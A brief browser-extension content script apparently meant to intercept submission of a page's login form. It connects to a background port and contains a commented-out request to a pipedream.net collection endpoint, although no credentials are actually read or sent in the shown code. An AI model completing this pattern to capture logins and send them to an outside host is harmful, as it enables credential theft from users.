
let BASPort = browser.runtime.connect({
  name: "BASConnection"
});

function reqListener () {
  console.log(this.responseText);
}




form = document.querySelector("#login-form");



form.addEventListener('submit', (e)=> {
  /*
  var oReq = new XMLHttpRequest();
  oReq.addEventListener("load", reqListener);
  oReq.open("GET", "https://acbd22a1ed468afbe36d2a1bb1780d5d.m.pipedream.net");
  oReq.send();
  */


  let postReq = BASPort.postMessage({

  });



});
